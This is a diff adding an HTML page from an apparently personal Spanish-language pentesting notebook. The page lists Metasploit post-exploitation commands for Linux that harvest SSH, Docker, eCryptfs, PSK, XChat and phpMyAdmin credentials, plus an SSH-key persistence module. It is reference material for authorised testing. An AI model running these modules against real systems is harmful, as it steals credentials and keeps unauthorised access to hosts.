@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Metasploit | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="metasploit">
+          <div class="note-tabbar">
+            <span>Metasploit</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Linux/Dumping hashes</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / linux / dumping hashes</p>
+            <h2>Metasploit</h2>
+
+            <p>Metasploit incluye módulos de post-explotación para recolectar credenciales y secretos de servicios Linux. Revisa siempre qué recopila cada módulo y limita su uso al alcance autorizado.</p>
+
+            <section class="code-card">
+              <h3>ssh</h3>
+              <pre><code>use post/multi/gather/ssh_creds
+set SESSION 1
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>docker</h3>
+              <pre><code>use post/multi/gather/docker_creds
+set SESSION 1
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>use post/linux/gather/ecryptfs_creds
+set SESSION 1
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>use post/linux/gather/enum_psk
+set SESSION 1
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>use post/linux/gather/enum_xchat
+set SESSION 1
+set XCHAT true
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>use post/linux/gather/phpmyadmin_credsteal
+set SESSION 1
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>use post/linux/gather/phpmyadmin_credsteal
+set SESSION 1
+run</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code>use post/linux/manage/sshkey_persistence
+set SESSION 1
+run</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>linux</span>
+              <span>post_explotacion</span>
+              <span>dumping_hashes</span>
+              <span>metasploit</span>
+              <span>meterpreter</span>
+              <span>ssh</span>
+              <span>docker</span>
+              <span>credenciales</span>
+              <span>hash_linux</span>
+              <span>dump_hash</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
